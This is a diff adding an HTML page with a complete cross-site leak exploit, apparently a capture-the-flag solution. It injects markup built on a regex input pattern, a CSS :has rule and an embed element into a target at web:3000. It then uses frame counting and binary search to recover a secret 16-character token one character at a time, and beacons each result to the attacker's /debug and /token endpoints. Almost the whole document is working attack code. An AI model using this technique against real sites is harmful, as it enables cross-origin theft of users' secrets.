@@ -1,0 +1,68 @@
+<body>
+  <script type="module">
+    const BASE_URL = "http://web:3000";
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const TOKEN_SIZE = 16;
+
+    let known = "TOKEN_";
+    const win = open("");
+
+    const CHARS = [..."0123456789abcdef"];
+
+    const match = async (pattern) => {
+      win.location = "about:blank";
+      while (true) {
+        try {
+          win.origin;
+          break;
+        } catch {
+          await sleep(3);
+        }
+      }
+
+      const content = `
+        <link href="not-found.txt?{}div:has(input:valid){display:none}" rel=stylesheet>
+        <div>
+          <embed code="x" type=text/html>
+          <input pattern=".+${pattern}.+" value="
+      `;
+      const url = `${BASE_URL}?content=${encodeURIComponent(
+        content
+      )}${"&a".repeat(1000)}`;
+
+      win.location = url;
+      while (true) {
+        try {
+          win.origin;
+          await sleep(3);
+        } catch {
+          break;
+        }
+      }
+      await sleep(100);
+
+      return win.length === 0; // frame counting
+    };
+
+    for (let i = 0; i < TOKEN_SIZE; i++) {
+      let left = 0;
+      let right = CHARS.length;
+      while (right - left > 1) {
+        const mid = (right + left) >> 1;
+
+        const p = "(" + CHARS.slice(left, mid).join("|") + ")";
+        if (await match(known + p)) {
+          right = mid;
+        } else {
+          left = mid;
+        }
+      }
+      known += CHARS[right - 1];
+      navigator.sendBeacon("/debug", known);
+    }
+
+    navigator.sendBeacon("/token", known);
+  </script>
+</body>
